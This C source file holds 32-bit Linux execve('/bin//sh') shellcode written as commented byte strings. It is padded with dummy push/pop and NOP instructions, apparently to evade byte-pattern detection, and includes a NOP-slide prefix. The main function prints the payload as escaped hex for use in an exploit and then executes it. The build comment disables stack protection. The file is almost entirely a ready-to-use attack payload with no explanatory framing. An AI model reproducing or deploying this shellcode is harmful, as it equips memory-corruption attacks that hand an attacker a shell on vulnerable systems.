#include <stdio.h>
// gcc -z execstack -o shellcode5 shellcode5.c -m32

char nopslide[]  = "\x90\x90\x90\x90"
                   "\x90\x90\x90"
                   "\x68\x00\x00\x00\x00"	// push 0x00000000
                   "\x58";			// pop eax

char shellcode[] = "\x31\xc0"			// xor eax, eax
                   "\x50"			// push eax
                   "\x90\x90\x90"		// nop; nop; nop; nop
                   "\x68\x00\x00\x00\x00"	// push 0x00000000
                   "\x58"			// pop eax
                   "\x68\x2f\x2f\x73\x68"	// push 0x78732f2f
                   "\x90"			// nop
                   "\x68\x00\x00\x00\x00"	// push 0x00000000
                   "\x58"			// pop eax
                   "\x68\x2f\x62\x69\x6e"	// push 0x6e69622f
                   "\x90"			// nop
                   "\x68\x00\x00\x00\x00"	// push 0x00000000
                   "\x58"			// pop eax
                   "\x89\xe3"			// mov ebx, esp
                   "\x89\xc1"			// mov ecx, eax
                   "\x89\xc2"			// mov edx, eax
                   "\x68\x00\x00\x00\x00"	// push 0x00000000
                   "\x58"			// pop eax
                   "\xb0\x0b"			// mov al, 0xb
                   "\xcd\x80"			// int 0x80
                   "\x31\xc0"			// xor eax, eax
                   "\x68\x00\x00\x00\x00"	// push 0x00000000
                   "\x58"			// pop eax
                   "\x40"			// inc eax
                   "\xcd\x80";			// int 0x80


int main() {
	printf("shellcode len: %d\n", sizeof(shellcode)-1);
	printf("nopslide: ");
	for (int i = 0; i < sizeof(nopslide)-1; ++i)
		printf("\\x%02hhx", nopslide[i]);
	printf("\n");
	printf("shellcode: ");
	for (int i = 0; i < sizeof(shellcode)-1; ++i)
		printf("\\x%02hhx", shellcode[i]);
	printf("\n");
	(*(void(*)()) shellcode)();
	return 0;
}
